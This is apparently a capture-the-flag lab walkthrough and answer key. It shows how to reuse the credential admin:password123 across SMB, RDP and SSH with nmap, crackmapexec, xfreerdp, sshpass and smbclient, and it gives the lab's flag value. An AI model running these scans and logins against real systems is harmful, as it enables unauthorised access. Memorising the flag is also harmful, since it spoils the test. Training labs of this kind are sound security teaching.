# Lab 8.3: Multi-Service Credential Reuse
## Learning Objectives
- Use one set of credentials on multiple services
- Understand comprehensive credential reuse
- Capture the flag
## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before starting credential discovery.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify multiple services are running:**
   ```bash
   nmap -p 445,3389,22 <target_ip>
   ```

### Step 2: Discover Credentials

Find credentials on any service (SMB, RDP, or SSH).

**Detailed Steps:**

1. **Method 1: Discover via SMB:**
   ```bash
   crackmapexec smb <target_ip> -u admin -p password123
   ```

   **Expected output:**
   ```
   SMB   <target_ip>  445  TARGET  [+] admin:password123
   ```

2. **Method 2: Discover via RDP:**
   ```bash
   xfreerdp /v:<target_ip> /u:admin /p:password123
   # Look for credential files on desktop or in documents
   ```

3. **Method 3: Discover via SSH:**
   ```bash
   ssh admin@<target_ip>
   # Password: password123
   cat credentials.txt
   exit
   ```

4. **Document discovered credentials:**
   - Username: `admin`
   - Password: `password123`
   - Source: Any service (SMB, RDP, or SSH)

### Step 3: Test on All Services

Test the discovered credentials across all available services to demonstrate multi-service credential reuse.

**Detailed Steps:**

1. **Test credentials on SMB:**
   ```bash
   crackmapexec smb <target_ip> -u admin -p password123
   ```

   **Expected output:**
   ```
   SMB   <target_ip>  445  TARGET  [+] admin:password123
   ```

   **What this confirms:**
   - Credentials work on SMB service
   - Same username/password authenticates to SMB

2. **Test RDP:**
   ```bash
   xfreerdp /v:<target_ip> /u:admin /p:password123
   ```

   **Expected output:**
   - RDP client window opens
   - Windows desktop appears
   - You're logged in as admin

   **What this confirms:**
   - Credentials work on RDP service
   - Same username/password authenticates to RDP

3. **Exit RDP and test SSH:**
   ```bash
   # Exit RDP session
   ssh admin@<target_ip>
   ```

   **Enter password when prompted:**
   ```
   admin@<target_ip>'s password:
   ```
   
   Type: `password123`

   **Expected output:**
   ```
   Welcome to Ubuntu 20.04.5 LTS
   ...
   admin@target:~$
   ```

   **What this confirms:**
   - Credentials work on SSH service
   - Same username/password authenticates to SSH

4. **Document credential reuse results:**
   ```
   Credential Reuse Results:
   - SMB: ✅ Works (admin:password123)
   - RDP: ✅ Works (admin:password123)
   - SSH: ✅ Works (admin:password123)
   ```

### Step 4: Retrieve Flag

The flag is located at `/tmp/private/flag.txt` and can be retrieved via SSH using the discovered credentials.

**Detailed Steps:**

1. **Retrieve via SSH:**
   ```bash
   ssh admin@<target_ip>
   # Password: password123
   cat /tmp/private/flag.txt
   ```

   You can also retrieve the flag non-interactively with `sshpass`:
   ```bash
   sshpass -p 'password123' ssh admin@<target_ip> cat /tmp/private/flag.txt
   ```

2. **Alternative: Retrieve via SMB:**
   ```bash
   smbclient //<target_ip>/tmp -U admin%password123
   cd private
   get flag.txt
   exit
   cat flag.txt
   ```

3. **Alternative: Retrieve via RDP:**
   ```bash
   xfreerdp /v:<target_ip> /u:admin /p:password123
   # Then in RDP session:
   # Open Command Prompt and type:
   type C:\tmp\private\flag.txt
   ```

4. **Expected flag content:**
   ```
   OCR{cr3d_r3us3_mult1}
   ```

5. **Copy flag:**
   - Select flag text
   - Copy to clipboard

### Step 5: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{cr3d_r3us3_mult1}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- ✅ Verified target IP and multiple services accessibility (SMB, RDP, SSH)
- ✅ Discovered credentials on any service
- ✅ Documented credentials (admin/password123)
- ✅ Successfully tested credentials on SMB service
- ✅ Successfully tested credentials on RDP service
- ✅ Successfully tested credentials on SSH service
- ✅ Retrieved flag from /tmp/private/flag.txt via SSH
- ✅ Verified flag format is correct: `OCR{...}`

**Key Learning Points:**
- Credentials often work across multiple different services
- Multi-service credential reuse is common in Windows/Linux environments
- Same accounts authenticate to SMB, RDP, SSH, WinRM, etc.
- Discovering credentials on one service enables access to all services
- Understanding credential reuse enables comprehensive network access
## Hints
1. Same credentials: admin:password123
2. Works on SMB, RDP, SSH
3. Flag in /tmp/private/flag.txt